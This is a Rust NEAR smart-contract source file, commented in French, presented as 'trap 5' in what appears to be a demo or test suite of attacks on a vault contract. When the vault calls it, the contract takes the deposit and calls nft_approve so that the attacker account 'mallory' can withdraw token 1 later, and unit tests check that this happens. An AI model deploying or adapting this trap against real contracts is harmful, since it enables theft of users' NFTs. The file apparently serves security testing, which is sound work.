//! Piège 5 : `approver.test.near` — profite du passage pour faire approuver un NFT.
//!
//! `trap` appelle `nft_approve { to: mallory.test.near, token_id: "1" }` sur la
//! collection `test-nft.test.near`. L'approbation ne coûte rien à l'attaquant et
//! donne à `mallory` le droit de retirer le NFT plus tard : c'est R3.
//!
//! **Prérequis de la démo** : pour que `test-nft` accepte l'approbation, il faut
//! que le compte qui appelle (`vault.test.near`, puisque le coffre joue la
//! transaction sous son propre nom) soit le **détenteur courant** du jeton `1`.
//! Donc, avant l'attaque :
//!   1. `owner.test.near` frappe le jeton `1` (`test-nft.mint_to { to: "vault.test.near", token_id: "1" }`) ;
//!   2. ou, s'il l'a frappé ailleurs, il le transfère au coffre
//!      (`test-nft.nft_transfer { to: "vault.test.near", token_id: "1" }`).
//!
//! Sans ce prérequis, l'appel échoue proprement (« Seul le detenteur peut approuver ce jeton »).

use near_sdk::{env, near, serde_json, AccountId, Gas, NearToken, PanicOnDefault, Promise};

/// Compte de la collection NFT.
pub const DEFAULT_COLLECTION: &str = "test-nft.test.near";
/// Compte qui reçoit l'approbation.
pub const DEFAULT_THIEF: &str = "mallory.test.near";
/// Jeton visé par l'approbation.
pub const TOKEN_ID: &str = "1";
/// Gas laissé à l'appel d'approbation.
const GAS_FOR_APPROVE: Gas = Gas::from_tgas(10);

/// État du piège.
#[near(contract_state)]
#[derive(PanicOnDefault)]
pub struct Approver {
    collection: AccountId,
    thief: AccountId,
    attempts: u64,
}

#[near]
impl Approver {
    /// Crée le piège avec la collection et le compte à approuver.
    #[init]
    pub fn new(collection: AccountId, thief: AccountId) -> Self {
        Self {
            collection,
            thief,
            attempts: 0,
        }
    }

    /// Piège : encaisse le dépôt et tente de faire approuver le jeton `1`.
    #[payable]
    pub fn trap(&mut self, args: String) -> bool {
        self.attempts = self.attempts.saturating_add(1);
        let payload = serde_json::json!({
            "to": self.thief,
            "token_id": TOKEN_ID,
        });
        let bytes = match serde_json::to_vec(&payload) {
            Ok(bytes) => bytes,
            Err(_) => env::panic_str("Arguments d'approbation non serialisables"),
        };
        env::log_str(&format!(
            "approver: tentative d'approbation de {} vers {} (args: {})",
            TOKEN_ID, self.thief, args
        ));
        Promise::new(self.collection.clone())
            .function_call(
                "nft_approve".to_string(),
                bytes,
                // 1 yoctoNEAR : exigence NEP-171 de courtoisie.
                NearToken::from_yoctonear(1),
                GAS_FOR_APPROVE,
            )
            .detach();
        true
    }

    /// Collection visée.
    pub fn collection(&self) -> AccountId {
        self.collection.clone()
    }

    /// Compte qui serait autorisé à retirer le NFT en cas de succès.
    pub fn thief(&self) -> AccountId {
        self.thief.clone()
    }

    /// Nombre de tentatives.
    pub fn attempts(&self) -> u64 {
        self.attempts
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use near_sdk::mock::MockAction;
    use near_sdk::test_utils::{get_created_receipts, VMContextBuilder};
    use near_sdk::testing_env;

    fn id(name: &str) -> AccountId {
        match name.parse() {
            Ok(a) => a,
            Err(_) => panic!("compte de test invalide"),
        }
    }

    #[test]
    fn l_approbation_part_vers_mallory() {
        let ctx = VMContextBuilder::new()
            .current_account_id(id("approver.test.near"))
            .predecessor_account_id(id("vault.test.near"))
            .signer_account_id(id("vault.test.near"))
            .attached_deposit(NearToken::from_yoctonear(2 * 10u128.pow(24)))
            .build();
        testing_env!(ctx);

        let mut contract = Approver::new(id(DEFAULT_COLLECTION), id(DEFAULT_THIEF));
        assert!(contract.trap("{}".to_string()));
        assert_eq!(contract.attempts(), 1);

        let receipts = get_created_receipts();
        let cible = receipts
            .iter()
            .find(|r| r.receiver_id == id(DEFAULT_COLLECTION))
            .expect("un appel a la collection doit etre cree");

        let (method, args) = cible
            .actions
            .iter()
            .find_map(|a| match a {
                MockAction::FunctionCallWeight {
                    method_name, args, ..
                } => Some((method_name.clone(), args.clone())),
                _ => None,
            })
            .expect("le recu doit contenir un appel de fonction");

        assert_eq!(method, b"nft_approve".to_vec());
        let texte = String::from_utf8_lossy(&args);
        assert!(
            texte.contains(DEFAULT_THIEF),
            "le beneficiaire doit etre mallory"
        );
        assert!(texte.contains(TOKEN_ID), "le jeton vise doit etre 1");
    }
}
